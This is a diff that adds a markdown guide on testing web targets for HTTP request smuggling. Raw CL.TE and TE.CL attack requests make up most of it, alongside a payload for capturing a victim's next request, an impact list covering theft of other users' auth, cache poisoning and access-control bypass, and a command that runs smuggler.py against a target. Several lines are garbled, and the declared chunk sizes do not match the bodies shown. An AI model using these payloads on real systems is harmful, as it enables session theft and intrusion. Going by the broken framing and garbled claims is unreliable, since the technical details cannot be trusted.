@@ -1,0 +1,71 @@
+# HOW TO TEST HTTP REQUEST SMUGGLING ON A TARGET (2026 expert guide)
+# Exploits mismatch between front-end (proxy/LB/CDN) and back-end (app server) parsing.
+
+## The two engines (all that matters)
+- CL.te: front-end uses Content-Length, back-end uses Transfer-Encoding.
+- TE.cl: front-end uses Transfer-Encoding, back-end uses Content-Length.
+- TE.TE / obfuscated TE: send TE header that one side reads as valid, the other sees one of the pair.
+- HTTP/2 downgade: H2 to H1 conversion desyncs (connection upgrades/h2c).
+
+## Detection (safe, lab-first)
+1. Baseline: send request, note timing.
+2. CL.TE probe:
+   POST / HTTP/1.1
+   Host: target
+   Content-Length: 4
+   Transfer-Encoding: chunked
+   5c
+   GPOST / HTTP/1.1
+   ...
+   0
+   (check: 2nd response never arrives / "unrecognized GPOST" -> desync)
+3. TE.CL probe: swap - feed TE to front but make bytes a valid separate CL message.
+4. Time-based: smuggle a dreadfully slow chunk; if backend hangs for the TCP RTT -> desync.
+
+## Confirmation & impact
+- Confirmed -> impact ladder: poison other users' requests (request capture of their auth),
+  web cache poisoning, XSS-dxss via deleted raw, IP-based ACL bypass, WAF bypass.
+- Follow standard smuggle tools (smuggler.py, request-smuggler BApp).
+
+## Worked examples (concrete)
+# CL.TE (front reads CL, back reads TE) - port 443 HTTPS:
+CONNECT-free... simpler show the occluded classic:
+POST / HTTP/1.1\r\n
+Host: target.com\r\n
+Content-Length: 4\r\n
+Transfer-Encoding: chunked\r\n
+\r\n
+5c\r\n
+GPOST / HTTP/1.1\r\n
+Host: target.com\r\n
+Content-Type: application/x-www-form-urlencoded\r\n
+Content-Length: 15\r\n
+\r\n
+x=1\r\n
+0\r\n
+\r\n
+# If the response contains "Unrecognized method GPOST" -> CL.TE is real.
+# TE.CL (front reads TE, back reads CL):
+POST / HTTP/1.1\r\n
+Host: target.com\r\n
+Transfer-Encoding: chunked\r\n
+Content-Length: 4\r\n
+\r\n
+5c\r\n
+GPOST / HTTP/1.1\r\n
+Host: target.com\r\n
+\r\n
+0\r\n
+\r\n
+# Confirmed capture (steal victim's request):
+#   smuggle "GET /admin HTTP/1.1\r\nX-Ignore: x HTTP/1.1" -> victim's NEXT request appended to /admin
+# H2 downgade: send in h2 stream with x-head content, then upgrade the stream length trick.
+
+## Tool path
+git clone https://github.com/defparam/smuggler; python3 smuggler.py -u https://target.com
+# Burp BApp "HTTP Request Smuggler" (James/PortSwigger) does CL.TE/TE.CL/H2 automated.
+
+## False positives
+- Sending chunked to an app that rejects 400/501 = not a bug until you see the OTHER engine honor it.
+- A request timeout without the 2nd response is only proof when paired with correct framing.
+- If you see "Unrecognized method" error text in the body = that's the smoking gun.
